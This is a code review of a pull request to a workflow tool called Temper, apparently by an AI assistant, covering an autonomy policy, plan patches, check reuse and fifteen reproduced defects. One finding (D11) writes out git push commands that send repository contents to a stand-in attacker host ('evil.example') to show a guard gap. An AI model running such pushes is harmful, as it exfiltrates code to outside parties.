# PR #115, the flow half: a code review against the owner's goal

Reader: planners who will not read the code again. Every claim carries a file:line and one of four labels:
**[code]** verified in code, **[measured]** I ran it, **[doc]** only a claim in a doc, **[inferred]**.

Goal the review is judged against (the owner's words): "as efficient as possible, easy to use, no back and forth
between phases, fast and cost effective". The units are seconds, dollars, questions to the person, agent launches,
loop backs, and knobs a user has to learn.

## 0. What was reviewed, and how

- **Revision.** The working tree is `pr115` at `9a01eff`. **The pull request's head on GitHub is `10e965a`, three
  commits ahead of the working tree** [measured: `gh api repos/galando/temper/pulls/115` gives head `10e965a`;
  `gh api .../compare/9a01eff...10e965a` gives `ahead 3`]. The three commits (`573bb66`, `c417166`, `10e965a`) touch
  `scripts/flow.py` (+9 -2: `same_failure`, a "Run again" that ignores numbers), `scripts/gate_rows.py` (+25 -4, Maven
  rows), `scripts/e2e/*` and two selftest files, and add `docs/evidence/ab-replay-9.8.5.md`. I applied their diff on a
  clone and **ran every experiment below on both revisions; every defect in section 4 reproduces on `10e965a`** except
  D-E2E, which those commits fix. Line numbers are the working tree's (`9a01eff`); in `flow.py` they are the same on
  `10e965a` up to line 2569.
- **CI.** On `10e965a` all ten checks are green, the end to end job included [measured: `gh api
  .../commits/10e965a/check-runs`]. On `9a01eff` the end to end job is `cancelled`, and locally
  `bun scripts/e2e/run.ts both fix` fails on `9a01eff` (`FAIL fix [plain]`, `FAIL fix [mod]`, "e2e: 2 failed") and
  passes on `main` and on `10e965a` [measured].
- **Runs in a scratch clone** (never in `/home/user/temper`): `bash scripts/selftest/run-selftest.sh --fast` on
  `9a01eff`: `PASS: 832 FAIL: 0`, 2 min 53 s [measured]. `bash scripts/e2e/ab-replay.sh` on `10e965a`: the table of
  `docs/evidence/ab-replay-9.8.5.md` reproduces exactly (questions 8 / 8 / 4, agent launches 10 / 7 / 7) [measured].
  `bash scripts/check-mod-calls.sh`: OK. `tsc` and `claude plugin test .` were not run to a result here (no
  `claude-code` types on this machine); CI reports "Mod" green on `10e965a`.
- **Experiments.** Nine small scripts drive the real CLI through the selftest's own fixture helpers
  (`fresh`, `gpass`, `gfail`, `m_setup`, `nx`), on `main` and on the PR:
  `/tmp/claude-0/-home-user-temper/1ba4743b-465f-5ae6-8b88-a04ebb2fe840/scratchpad/work-pr-flow/exp1.sh` to `exp9.sh`;
  outputs on the true head in `.../work-pr-flow/out/*.head.txt`, on main in `out/*.main.txt`. They are quoted in the
  appendix.

## 1. The finding in brief

1. **The friction this PR removes is opt in; the friction it adds is on by default.** The one feature that removes
   questions (`autonomy.policy: decide`) needs a config edit before the run *and* the non recommended answer at the
   plan question. Four rules that add loop backs or failed gates are on with no config: High findings block, a Medium
   finding recommends a loop back to Build, any Design answer fails the Design gate and recommends a loop back to
   Plan, and claimed runs no longer count.
2. **The happy path of a default run asks the same five questions as before** (Intent, Plan, Build, Review, Check).
   With the policy armed it asks three (Intent, Plan, Commit).
3. **The policy has defects that defeat it**: it never launches the group fix agent and re-plans on Opus instead (D2);
   it loops back to Build twice on a criterion only the person can confirm (D3); after its own loop back to Plan the
   run stays armed whatever the person answers (D4).
4. **Three new paths have no exit**: the fix pass relaunches without end when `integrate` fails after it (D5); a task
   classified ENV can only be "checked again" or saved (D8); the commit question tells the person to "check again"
   and offers no option that does (D10). One regression makes four options of the Review question unreachable in the
   most common Review outcome (D1).
5. **Not ready to merge as it is.** The parts that only save work (reuse, failure text, no empty fix pass, the four
   option cap, the commit override) are sound and could merge alone. Section 6 lists what must change first.

## 2. Each feature: what it does, its default, and its effect on a default user

"Default user" = the shipped `templates/temper.config.default`, the recommended option at every question, the run
not armed ("Stage by stage (Recommended)" is the recommended answer, `scripts/flow.py:673` [code]).

| # | Feature | What it does | Default | For a default user |
|---|---------|--------------|---------|--------------------|
| 1 | Run policy `autonomy.policy: decide` | An armed run goes on after Build: Review with an open finding at medium or above loops back to Build, a clean Review advances, a failed Check loops back to Build, a passed Check advances; a failed group check takes the question's recommended option when it needs no typing. Anything else parks; the commit always parks. `flow.py:296-298, 1144-1181, 1963-1972, 2457-2472` [code] | **Off** (`ask`). Commented out in the template (`templates/temper.config.default:146-148`). Also needs "Autonomous Build" at the plan or design question, which is not the recommended option (`flow.py:673-675, 726-730`) | **No effect.** When on: removes 2 questions on the happy path (Build gate, Review, Check go; the commit park adds one back): 5 to 3 [code]. See D2, D3, D4 |
| 2 | Plan patch `temper plan patch G<n>\|task N\|integration --cmd` | Rewrites one command line of the approved `tasks.md`, moves the plan hash, clears the patched group's gate, records a `PERSON` row; no loop is spent. `scripts/plan_patch.py:59-77, 102-136`, `scripts/temper:4565-4567` [code] | **Offered in every group failure question**; recommended only after a second time-out or a fix that changed nothing (`flow.py:2023-2034`) | **Removes** a loop back to Plan (Plan about 200 s on Opus, Design, every task again) when the cause is the command. **Adds** one option to every group failure question, which pushes "Save for later" behind "More options" [measured, appendix A], and when recommended asks the person to type a shell command |
| 3 | Reuse of a passing check | A group Validate or the Integration suite that passed with the same command and setup block on the same clean tree (`git rev-parse HEAD^{tree}`, nothing dirty outside `.temper/`) passes again without running. Kept in `<git dir>/temper-results.json`, 200 entries. `scripts/run_env.py:121-180`, `scripts/task_ops.py:464, 488` [code] | **On**, no knob, no way to switch off or clear | **Removes** a suite run where Validate and Integration are the same text on the same tree (the one group case) [measured: second `group gate` prints "reused, not run again"]. Check's suite is not covered (`scripts/check_run.py` calls no `run_cached`) [code] |
| 4 | Runs the CLI saw against claimed runs | The Build gate's `RED then GREEN` row and Check's `tests pass` row count a run only when `executed_by` is `cli` or `person`. `scripts/runs.py:30-56`, `scripts/temper:3634, 3869` [code]. `temper evidence void` marks a false pass (`runs.py:59-80`, `scripts/temper:1803-1804`) | **Strict** (`evidence.claimed-runs: ignore`); `count` restores the old rule | **Adds** a way for Build and Check to fail. Needed for honesty, but `agents/check.md:30-33` and `reference/check.md:8` still tell the Check agent to claim (D6) |
| 5 | Staged RED proof | `task start` hashes each declared code file; a RED hashes them again; a RED whose code files are already the final code, when this attempt wrote that code, does not count. `scripts/task_ops.py:168-192, 419-423, 441-455, 689-695`, `scripts/temper:2990, 3115` [code] | **On** (lenient: a stub is allowed); `build.red-before-code: true` is strict | **Adds** a reason a task gate fails, so a task agent may run again (122 to 193 s each). One comment line added after the staged RED passes it [measured, appendix H] |
| 6 | Design answers hold Build | `temper intent answer 'Design: ...'` stores the answer with the hash of `tasks.md`; the Design gate row `tasks agree with decisions` fails while `tasks.md` is byte for byte the same. `scripts/decisions.py:40-69`, `scripts/answer_ops.py:147`, `scripts/temper:3735-3736`, `flow.py:733-739`. Build task prompts also carry the Design decisions (`decisions.py:93-105`, `flow.py:1432-1434, 1715`) [code] | **On**, no knob | **Adds a recommended loop back to Plan to every Design run in which the person answers a Design question**, even when the answer is the rule the plan already has [measured, appendix D]. Or an override plus a reason dialog; after the override the run can no longer be armed (D9b) |
| 7 | High findings block; Medium recommends repair | `review.block-on` defaults to `[critical, high]` (`flow.py:420`, `scripts/temper:3814`, template line 31). A passed Review with an open finding at medium or above recommends "Loop back to Build" (`flow.py:779-788`). Both questions count the open findings (`flow.py:1422-1430`) [code] | **On**. A config that already says `block-on: [critical]` keeps it; the Medium rule applies whatever the config says | **Adds loop backs**: main recommended "Continue to Check" for a Medium or a High finding; the PR recommends "Loop back to Build" [measured, appendix B]. Each costs a Build fix agent, a Review agent and Check again. Also triggers D1 |
| 8 | Integrate reruns after new commits | `integrate` records HEAD; called again on a PASS with HEAD moved, it runs the Integration suite again. `scripts/temper:3292-3296, 3316-3327` [code] | **On**, no knob | **Adds** one suite run per fix pass that commits. Catches a broken suite one stage earlier. An uncommitted fix is not seen (the trigger is HEAD, not the tree). Creates D5 |
| 9 | Failure text | Time-out first, then the build tool's summary (Maven goal, `Rule violated`, failed tests), then FAIL lines without a passing test's log lines; a park reason keeps 1200 characters. `scripts/task_ops.py:125-141`, `flow.py:1973-1974` [code] | **On** | **Removes** wrong clicks; no question, no row. Sound |
| 10 | SETUP verdict at Check | An environment fault in the suite or acceptance run adds a `setup fault:` row; the question says SETUP, recommends repairing, never a loop back. `scripts/check_run.py:177-186, 700-703, 728-731`, `flow.py:837-851, 1229-1234` [code] | **On** | **Removes** a wasted loop back to Build. But the recommendation repeats without end (D8b), and `Connection refused` anywhere in a failing suite's output counts as an environment fault (`scripts/preflight.py:33-34`) |
| 11 | Recommendation rules | No fix pass without a fault in its prompt (`flow.py:1659-1664`); a fix agent that changed nothing keeps the check failed, counts `fix_empty` (`scripts/group_fix.py:79-86`); "twice the time" recommended only at the first time-out (`flow.py:1989-1995`); "Override and commit" only where it can clear the row (`flow.py:2250-2277`); four options at most (`flow.py:493-498`); Context answer up to 2000 characters (`scripts/plan_ops.py:28, 131-136`) [code] | **On** | **Removes** an agent launch, a rerun of an unchanged tree, an endless doubling, a five option dialog (main had five at a first time-out [measured, appendix A]). The commit change creates D10 |
| 12 | Note in the question | `temper state set ask_note '<step>: <text>'` appends "Note from Claude (not from Temper): ..." to the CLI's question of that step. `flow.py:2348-2358`, `commands/temper.md:139-142` [code] | Available; used only when the orchestrator runs the call | Neutral on questions. Costs a model turn and two CLI calls each time it is used |
| 13 | Backup push | The mod's session guard allows `git push <remote> <src>:temper-backup/<name>` during a run. `hooks/temper-mod/core/session.ts:120-134, 154` [code] | Allowed with the mod; **nothing asks for it**: no brief, command or CLI step names `temper-backup` (grep: only `session.ts` and `docs/flow.md:259`) [measured] | No effect on a run. The remote is not checked (D11) |
| + | ENV at a task gate (flow side) | A failing GREEN whose output names an environment fault gives verdict ENV: no attempt spent, the question "Check it again (Recommended)" in every mode. `scripts/task_ops.py:761-767`, `scripts/temper:3128-3132`, `flow.py:1729-1731, 1857-1870` [code] | **On** | **Removes** up to three task agent attempts on a broken environment. **Adds** a question kind. No way out when the classification is wrong (D8) |
| + | Lock never written past | A write waits up to `TEMPER_LOCK_MAX_S` (120 s), then fails with exit 75. `scripts/temper:419-441` [code] | **On** | A rare lost row becomes a rare failed call, which stops its action (`commands/temper.md:128-132`) |
| + | Interfaces by shape | An Interfaces literal also matches with qualifiers stripped from both sides. `scripts/task_ops.py:145-156, 520` [code] | **On** | Removes a false failure. Slightly easier to pass: `client.send(msg)` now matches any `send(msg)` [inferred from the regex] |

## 3. Net effect on a default run (no config change)

### Questions on the happy path

| Run | Questions | Which | Source |
|-----|----------:|-------|--------|
| main, default | 5 | Intent, Plan, Build, Review, Check (the commit is a `work` action) | `flow.py:633-637, 652-689, 745-752, 772-791, 815-821, 2245-2246` [code] |
| PR, default | 5 | the same | the same lines [code] |
| PR, armed without the policy | 4 | Intent, Plan (arm), Review, Check | `flow.py:2454-2462` [code] |
| PR, armed with the policy | 3 | Intent, Plan (arm), Commit | `flow.py:2468-2472, 2227-2244` [code] |

Add one per Blocking question, one for the Context check when the map has an ignore or a gap
(`templates/temper.config.default:104`), one for Design when it runs, one per group in a plan of two or more groups
(`flow.py:1758-1766`). The PR's own replay of a faulty project counts 8, 8 and 4 questions for 9.8.4, 9.8.5 and
9.8.5 with the policy [measured: `bash scripts/e2e/ab-replay.sh` on `10e965a`; agents are scripted, agent minutes are
an estimate, `docs/evidence/ab-replay-9.8.5.md` on `10e965a`].

### What the PR adds and removes when the user changes nothing

| Kind | Added (default on) | Removed (default on) |
|------|--------------------|----------------------|
| Questions, happy path | 0 | 0 |
| Question kinds | "Task N failed on the environment... Check it again?" (`flow.py:1857-1870`); the typed "Group command" dialog (`flow.py:2024-2028`); the Design hold question (`flow.py:733-739`) | none |
| Dialog steps | "More options" before "Save for later" at every group failure (4 options on main, 3 + More on the PR) [measured, appendix A]; a reason dialog when the Design hold is overridden | the refused five option dialog at a first time-out [measured] |
| Gate rows | plan: `maven filtered verify` (`scripts/gate_rows.py:158-191, 312`), plus `preflight` from the other half (`scripts/temper:3600-3601`); design: `tasks agree with decisions` (`scripts/temper:3735-3736`) | none |
| Loop backs recommended | Review to Build for any open Medium (`flow.py:780-784`); Review to Build because High now fails the gate (`flow.py:420`); Design to Plan after any Design answer (`flow.py:738-739`) | Check to Build on an environment fault (`flow.py:837-851`); Build to Plan when the group's command is the cause, after a second time-out or an empty fix (`flow.py:2023-2032`) |
| Retries | a task whose RED was staged (`task_ops.py:689-692`); a stage whose agent claimed its runs (`runs.py:30-33`) | up to three task attempts on an environment fault (`task_ops.py:761-767`); a fix agent with nothing to fix (`flow.py:1660-1664`); a rerun of an unchanged tree (`group_fix.py:79-86`) |
| Suite runs | Integration again after each fix pass that commits (`scripts/temper:3316-3327`) | Integration when it equals Validate on the same tree (`run_env.py:149-180`) |
| Knobs | `autonomy.policy`, `build.red-before-code`, `evidence.claimed-runs` (template lines 146, 156, 159); a changed default for `review.block-on` (line 31). Other half: `plan.preflight-timeout`, `plan.preflight-skip`, `setup:` | none. `autonomy.budget.max-total-loops` and `max-stages` stay in the template (lines 151-153) and **no code reads them** [measured: `grep -rn "max-total-loops\|max-stages" scripts hooks` finds nothing outside the selftest] |
| CLI verbs | `plan patch`, `evidence void`, `state set ask_note` (other half: `plan preflight`, `doctor`) | none |

**Is the lowest friction behaviour the default?** No. It is opt in twice: `autonomy.policy: decide` must be written
into `.claude/temper.config` (the mod guards that file while a run is active, `hooks/temper-mod/core/rules.ts:521-524`,
so it must be written before the run), and the person must pick "Autonomous Build: run Build unattended", the second
option after "Stage by stage (Recommended)" (`flow.py:673-675`). The policy is named in one doc section
(`docs/flow.md:224-235`) and a template comment; the mod draws nothing for it (`grep -rn policy hooks/temper-mod`:
nothing) [measured].

## 4. Correctness: defects, with a reproduction for each

Severity: **A** = wrong behaviour on a path the PR itself opens, fix before merge; **B** = should be fixed with it;
**C** = note.

### D1 (A, regression). A passed Review with an open Medium finding loses four options; "More options" opens itself

`flow.py:780-788` now puts "Loop back to Build (Recommended)" first. `add_adhoc` drops "Teach Me" only when the first
label starts with "Continue" (`flow.py:925-930`), so the More question keeps four options, the `else` branch at
`flow.py:943-947` runs, and it builds a new More question from `q["options"][3:]`, which is the existing "More
options" entry. The first More question (Accept a finding, Grill Me, Teach Me, Save for later) is discarded.
[measured, appendix B]: the question tree is `Loop back to Build (Recommended) | Continue to Check | Architecture
Depth Review | More options`, then `More options | Make a small change`. "Accept a finding" and "Save for later" are
unreachable; the accept question exists and no option leads to it. On main the same state gives `Continue to Check
(Recommended) | Loop back to Build | Architecture Depth Review | More options` and `Accept a finding | Grill Me | Make
a small change | Save for later`. The mod's driver hands the run back after six rounds
(`hooks/temper-mod/core/driver.ts:284`). This is the most likely Review outcome after feature 7.

### D2 (A). Under the policy the group fix agent is never launched; the run re-plans on Opus instead

`flow.py:1754-1755` launches the fix agent only when the run is **not** armed. The policy's first move at a failed
group is the auto call `group fix G1`, which only records the request and counts `fix_tries`
(`scripts/group_fix.py:65-72`). The next `temper next` skips the agent (armed), reaches `group_failed`, finds
`fix_tries` 1, so the recommended option is now "Loop back to Plan", and the policy takes it (`flow.py:1963-1972`).
[measured, appendix E]: step 1 `group fix G1`; step 2 `state loop build plan --reason 'policy: group G1 failed its
check ...'`, "grouped run reset for the re-plan"; step 3 the Plan agent on opus. No fix was tried, every task's work
is dropped, and the run's one Build to Plan loop is spent, all inside one `temper go`. Not armed, the same state
launches `temper:temper-build` [measured]. The selftest asserts only the first call
(`scripts/selftest/temper-cases-28.sh:39-41`); no e2e scenario and no step of the A/B replay reaches this path
[measured: `grep -n policy scripts/e2e/*.ts` on `9a01eff` finds nothing; on `10e965a` `scripts/e2e/replay.ts` turns
the policy on at line 309 and holds no `group fix` step].
This also breaks a stated invariant: "NEVER re-plans unattended" (`templates/temper.config.default:138-141`), "Build
never loops back to Plan by itself", "never plans again by itself" (`reference/autonomy.md:28, 35`); neither file is
changed by the PR, while `docs/flow.md:231-233` says the policy does loop back to Plan. Doc and doc disagree.

### D3 (A). The policy loops back to Build for a criterion only the person can confirm

`policy_move` for Check parks on a setup fault, a measurement gap and the acceptance tests row, and loops back on
everything else (`flow.py:1173-1180`). A `Validate: manual` criterion fails Check with `acceptance evidence: AC-09 has
no supported passing evidence row`; the interactive question for it is "Confirmed (Recommended)"
(`flow.py:825-836`). [measured, appendix F]: armed with the policy, the same state gives `state loop check build
--reason 'policy: acceptance evidence: AC-09 has no supported passing evidence row'`. Each loop is a Build fix agent,
a Review agent and Check again, for something no agent may record (`agents/check.md:9-10`); after two it parks with
"the loop budget is spent".

### D4 (A). After the policy's loop back to Plan the run stays armed, whatever the person answers

No call resets `run_mode` on a loop back or on leaving Plan (`scripts/temper:1112-1220, 1269-1295` [code]).
[measured, appendix E]: after the policy's `state loop build plan`, `run_mode` is `autonomous`; the plan question's
"Stage by stage (Recommended)" runs `spec branch`, `spec commit`, `state advance plan_complete build` and no reset;
when Build's gate then passes, `temper next` says "Build passed; the policy run goes on to Review." The person chose
stage by stage and got an unattended run through Review and Check.

### D5 (A, new loop). The fix pass relaunches without end when `integrate` fails after it

After a loop back to Build the fix agent's `after` calls are `usage add`, `integrate`, `gate build`
(`flow.py:1665-1672`). With feature 8, `integrate` on a PASS with HEAD moved runs the suite and returns 1 when it
fails (`scripts/temper:3316-3324`). A failed call stops its action, so `gate build` never runs
(`commands/temper.md:128-132`; the driver hands back, `driver.ts:432`). The next `temper next` finds no Build verdict
and an integration verdict that is truthy (`FAIL`), so it launches the same fix agent (`flow.py:1658`), and its
prompt is `feedback_lines() or fault_lines()` (`flow.py:1659`): the old loop reason, without the integration failure.
[measured, appendix G]: three rounds, each `action=work agent=temper:temper-build`, "the prompt names the integration
failure: False", build verdict None. No counter, no question and no "failed the same way" rule is on this path (that
rule lives in the Build gate question, `flow.py:755-763`, which is never reached). On main `integrate` on a PASS only
reran the scenario tests and returned 0, so `gate build` always ran.

### D6 (A). The Check agent's brief still records claims, which the new default never counts

`agents/check.md:30-33` says `evidence add --stage check --claim "tests" ... --exit <code>`; `reference/check.md:8`
points at it. `evidence add` writes no `executed_by` (`scripts/temper:1563-1579`), so `runs.check` drops the row
(`scripts/runs.py:30-33, 48-51`). [measured]: with the shipped defaults that row gives `tests pass: no passing
test-run evidence recorded`. The Check agent runs exactly when the CLI cannot find the project's test command
(`agents/check.md:7-9`, `flow.py:1551-1556`), so on such a project Check cannot pass `tests pass`.
Related test gap: the selftest fixture sets `evidence.claimed-runs: count` (`scripts/selftest/test-temper.sh:77-78`),
so all but one case file run in the non default mode; only `temper-cases-31.sh` runs strict.
**D-E2E** (fixed on `10e965a`): on `9a01eff` the e2e `fix` scenario fails for the same reason; `10e965a` changes the
mock agents to `evidence run` (`scripts/e2e/scenarios.ts`, +8 -6).

### D7 (A, config). The template's new empty `build:` key silently discards the documented `build.grouped` block

The PR adds an uncommented `build:` with only comments under it (`templates/temper.config.default:155-157`). The
parser assigns a new empty map on each key (`scripts/config_yaml.py:27-30`), and the commented block the template
tells users to uncomment is above it (`templates/temper.config.default:121-130`). [measured]: after uncommenting
`build: grouped: task-model:`, `config_yaml.get(..., 'build.grouped.task-model')` returns the default; the block is
gone. Main has no uncommented `build:` (`git show origin/main:templates/temper.config.default | grep -n '^build:'`:
nothing).
The same last key wins rule hits the policy's own opt in. The PR's selftest and its replay turn the policy on by
appending a second block, `autonomy:\n  policy: decide` (`scripts/selftest/temper-cases-28.sh:5, 34`;
`scripts/e2e/replay.ts:309` on `10e965a`). [measured]: the template with that block appended parses to `autonomy =
{'policy': 'decide'}`; `park-on-touch` and `max-blast-radius` are gone. So every policy test in the PR runs without
`park-on-touch`, and a user who adds the block instead of uncommenting the line inside the existing one loses those
limits without a word.

### D8 (A). A task classified ENV has no way back to its agent; SETUP at Check repeats its recommendation

(a) `preflight.ENV_PATTERNS` includes `Connection refused` and `could not connect to server` anywhere in the output
(`scripts/preflight.py:33-34`). At a task gate that gives verdict ENV, exit 0, no attempt spent
(`scripts/task_ops.py:761-767`, `scripts/temper:3128-3132`), and the question has two options: "Check it again
(Recommended)" and "Save for later" (`flow.py:1865-1869`). [measured, appendix H]: a wrong implementation whose
failing test prints "Connection refused" stays `running, attempt 1` through three gates, the same question each
time. No option says "it is the code".
(b) At Check, "Repair the environment and run again (Recommended)" is returned before the "failed the same way" rule
(`flow.py:837-851` precede `flow.py:852-863`). [measured]: three rounds, the same recommended option each time. The
9.8.4 rule "following the recommendation always ends" (`docs/flow.md:125-126`) does not hold here.

### D9 (B). The Design hold fires on every answer, and its override closes the unattended run

(a) `decisions.record` stores every `Design:` answer once `tasks.md` exists (`scripts/decisions.py:40-50`); the row
fails until `tasks.md` changes (`decisions.py:53-69`). The Design brief writes such a question for each concern that
needs a product call (`reference/design.md:37-42`), and the answer is given after the Design agent returned, so
nothing but a loop back to Plan can change `tasks.md`. [measured, appendix D]: answering "24 hours", the rule the plan
already has, turns "Continue to Build (Recommended)" into "Loop back to Plan (Recommended) | Override and continue |
Save for later". Cost of following it: Plan again (about 200 s, Opus) and Design again (about 100 s).
(b) The failed Design question has no arming option (`flow.py:738-739`); arming exists only in the passed one
(`flow.py:726-730`). After "Override and continue" the run is interactive to the end [measured: "an option that arms
the run: False"]. The cheap half of this feature, the decisions in every Build task prompt (`flow.py:1715`), already
addresses the incident it came from.

### D10 (B). The commit question says "then check again" and offers no option that does

When only the commit gate's own rows fail, the options are "Make a small change" and "Save for later"
(`flow.py:2252, 2269-2277`). [measured, appendix I]: for a `park-on-touch paths` row, no option's calls contain `gate
commit` and `next.gate` is None; on main "Override and commit" reran the gate. A resume asks the same question,
because the stored verdict is read (`flow.py:2224-2226`). The park-on-touch row reads only the files of `tasks.md`
(`scripts/temper:4204-4217`), so "Add to plan" does not clear it either.

### D11 (B, guard). The backup push allows any remote and any source ref

`backupPush` checks the options and the destination of each refspec, never the remote or the source
(`hooks/temper-mod/core/session.ts:124-134`). [measured with `bun`, `bashWhy`]: `git push
https://evil.example/x.git HEAD:temper-backup/x`, `git push git@other-host:someone/repo.git main:temper-backup/x` and
`git push origin refs/stash:temper-backup/x` are all allowed. The mod's tests cover `origin` only
(`tests/mod/session.test.ts:68-91`). Before the PR every push was refused outside Commit and Pipeline. The template
still says "autonomy NEVER pushes" (`templates/temper.config.default:138-139`).

### D12 (B). A plan patch keeps `fix_empty`, so the next real failure still blames the command

`plan_patch.py:123-124` clears only the group's gate. [measured, appendix C]: after a patch, a failure on `FAIL:
test_real_bug` still says "A fix agent changed nothing, so the cause is not in the group's code" and recommends
"Change the group's command" again; "Fix the group's merged work" is never recommended again (`flow.py:1996`).

### D13 (B). `plan patch` skips every plan gate row, and without the mod anyone can run it

The CLI takes the call from any caller and records "plan patch by the person ... [PERSON]"
(`plan_patch.py:134-136`); only the mod makes it the person's (`hooks/temper-mod/core/rules.ts:481`). [measured,
appendix C]: a Validate that exits 1, patched to `true`, passes the group check. The patched command is never run by
the preflight and never read by the Maven rows, because `gate plan` is not run again. The `task` and `integration`
targets work in the CLI and no question offers them (`flow.py:2027` is the only caller) [measured].

### D14 (C). `evidence void` is read in one place, and the reuse store ignores it

`voided` is read only by `scripts/runs.py:31` (grep). The task gate (`scripts/task_ops.py:678`), the criteria
(`scripts/acceptance.py:267`) and the reuse store do not read it. [measured, appendix H]: after voiding a group's
passing row, `group gate` passes again as "reused, not run again"; after voiding a task's only GREEN the task stays
`passed`. The store has no invalidation and no switch (`run_env.py:149-180`).

### D15 (C). Smaller points

- A failing `group gate` or `integrate` exits 1, which `temper go` reports as `error` (`scripts/go.py:103-113`
  special cases only `temper gate <stage>`; the driver's pattern ` gate [a-z]+` does not match `gate G1`,
  `driver.ts:261, 352`). Under the policy "twice the time" that fails again ends `temper go` with `error`
  [measured]; the run recovers on the next call, at the cost of a hand back. Older than this PR; the policy makes it
  more frequent.
- After one park the run is interactive for good; nothing re-arms it (`scripts/temper:4520-4521`) [measured: after a
  park at Build the passed Build gate asks "Continue to Review"].
- The policy parks where the interactive question recommends a retry: an unfinished Review ("Run Review again
  (Recommended)") and a failed Build gate ("Run Build again (Recommended)") [measured] (`flow.py:1172, 2464-2466`).
- A policy run cannot end in a pull request: "Commit and open PR" lives in the passed Check question, which the
  policy never asks, and is not offered to an armed run (`flow.py:891-892, 2242-2244`).
- `docs/flow.md:195-198` says an empty fix recommends the loop back to Plan; the code and `docs/flow.md:219-222`
  recommend "Change the group's command" [measured, appendix A].
- `docs/flow.md:231` says a loop back happens "while `loops.max-per-type` and the autonomy budget last"; only the
  per pair budget is read (`flow.py:318-321`, `scripts/loop_step.py:20-32`).
- The plan digest has three copies that must agree: `plan_patch.py:25-35`, `scripts/temper:2163`, `flow.py:132`
  (a selftest holds two equal, `scripts/selftest/temper-cases-29.sh:7-9`).

### Interactions asked for

| Pair | Result |
|------|--------|
| reuse + void | The void changes nothing the reuse reads; the pass is replayed (D14) [measured] |
| reuse + plan patch | A new command is a new key; no stale pass (`run_env.py:133-141`) [code] |
| reuse + spec commits | A commit that only touches `.temper/specs/` changes the tree hash, so no reuse after it (`run_env.py:134`) [inferred] |
| policy + budgets | Review to Build 2, Check to Build 2 (`fix.max-loops` when set), Build to Plan 1, then a park; no endless loop (`loop_step.py:20-32`, `flow.py:1157-1161`) [code]. `autonomy.budget.*` is unread |
| policy + group fix | D2 |
| policy + loop back to Plan + arming | D4 |
| plan patch + plan hash + the mod | The hash follows in `build-state.json` and `groups.json` (`plan_patch.py:116-122`); the mod allows the call only as the person's answer (`rules.ts:459-461, 481`). `approved-tasks.json` is left stale, which only empties `tasks_change_summary` (`flow.py:158-160`) [code] |
| integrate rerun + no empty fix pass + fix pass | D5 |

## 5. What the policy still parks for, and the distance to "one approval before Build, one at the commit"

Asked before Build in every mode (the policy starts only at arming): each Blocking question and the Intent question
(`flow.py:621-640`), the Context check (`flow.py:2334-2344`), the Plan question (`flow.py:652-689`), each Design
question and the Design question when Design runs (`flow.py:703-741`).

Parks or asks after arming, with the policy on:

| Where | What | Source |
|-------|------|--------|
| Build | a manual task | `flow.py:1890-1893` |
| Build | a task that failed on the environment (asked, not parked) | `flow.py:1729-1731, 1857-1870` |
| Build | a parked group: a task out of attempts, a blocked task, commits the CLI did not make | `flow.py:1795-1798, 1806-1809, 2074-2077` |
| Build | a group failure whose recommended option needs typing ("Change the group's command") or is "Save for later" | `flow.py:1966-1977` |
| Build | a failed Build gate (no "Run Build again") | `flow.py:2464-2466` |
| Review | an unfinished Review or any failed row with no open finding at medium or above; a spent loop budget | `flow.py:1157-1161, 1166-1172` |
| Check | a setup fault, a missing measurement, the acceptance tests row; a spent loop budget | `flow.py:1173-1180` |
| Commit | always: `SHIP-PENDING-COMMIT`, then "Commit (Recommended)" | `flow.py:2227-2231, 2242-2244` |
| after a loop back to Plan | the Plan question again (and Design) | `flow.py:2441` excludes plan |

What "exactly one approval before Build and one at the commit" still needs:

1. **One question before Build.** Today at least two (Intent, Plan), three with Design. The Intent gate would advance
   by itself when no Blocking question is open, or its acceptance would move into the Plan question; Design's
   decisions would be asked before the plan is approved, so the Design hold (feature 6) has nothing to hold.
2. **Arming as the answer, not a second option.** The single approval has to be the arming one: make the armed policy
   run the recommended option, or a config default.
3. **A policy that does what its text says.** Fix D2, D3, D4. Take the recommended retry once at a failed Build gate
   and an unfinished Review. Defer a manual criterion to the commit question.
4. **No environment stops after the approval.** The preflight (other half) has to cover what Check needs too (the
   coverage tool, the services), so SETUP and the measurement gap cannot appear after Build.
5. **A park that does not disarm.** After the person answers a parked question the run should go on armed.
6. **A commit question that can open the pull request** (`flow.py:891-892`).
7. **No typed command.** "Change the group's command" needs a proposed command the person can accept with a click.

## 6. Is this half ready to merge?

**No, not as it is.** The checks are green on `10e965a`, but they do not reach the defects above: the selftest
asserts single `temper next` answers, mostly in the non default evidence mode, and no end to end scenario runs the
policy.

Must change first:

| # | Change | Where | Size |
|---|--------|-------|------|
| 1 | Launch the group fix agent for an armed policy run; add an e2e scenario that runs a policy run through a failed group | `flow.py:1754` | S |
| 2 | Make `add_adhoc` put "Make a small change" into the existing More question whatever the first label is | `flow.py:925-947` | S |
| 3 | Park, not loop, on a criterion validated by hand | `flow.py:1173-1180` | S |
| 4 | Reset `run_mode` on a loop back to Intent, Plan or Design (or make "Stage by stage" set it) | `scripts/temper:1269-1295` or `flow.py:673` | S |
| 5 | Let a failed `integrate` in a fix pass still reach `gate build`, and put the integration failure in the next prompt | `flow.py:1659-1671`, `scripts/temper:3324` | S |
| 6 | `agents/check.md` and `reference/check.md`: `evidence run`; run the selftest fixture in the default mode | `agents/check.md:30-33`, `scripts/selftest/test-temper.sh:77-78` | S to M |
| 7 | Remove the empty `build:` and `evidence:` keys from the template (keep them as comments) | `templates/temper.config.default:155-160` | S |
| 8 | Give the ENV task question an option that sends the task back to its agent; stop recommending the same repair twice at Check | `flow.py:1865-1869, 837-851` | S |
| 9 | Give the commit question a "Check again" option | `flow.py:2269-2277` | S |
| 10 | Restrict the backup push to the run's own remote, or drop it until something uses it | `session.ts:124-134` | S |

Should change with it: clear `fix_empty` and `fix_tries` on a patch (D12); align `docs/flow.md:195-198, 231`,
`reference/autonomy.md:15-16, 28, 35`, `.claude/CLAUDE.md` and the template's invariants with what the policy does,
or keep the invariant and stop the policy from looping to Plan; decide whether the Design hold stays a gate row (D9).

Safe to merge alone, if the PR were split: features 3, 9, 11 (without the commit change until #9), the four option
cap, the Context answer length, feature 5.

## Appendix: experiment outputs (true head `10e965a` unless marked)

**A. Group failure question, main against PR** (`exp2.sh`):

```
main  first failure : Fix the group's merged work (Recommended)|Run the group's tasks again|Loop back to Plan|Save for later
PR    first failure : Fix the group's merged work (Recommended)|Run the group's tasks again|Loop back to Plan|More options
                      more: Change the group's command|Save for later
main  first time-out: Run the gate again with twice the time (Recommended)|Fix ...|Run ...|Loop back to Plan|Save for later   (five)
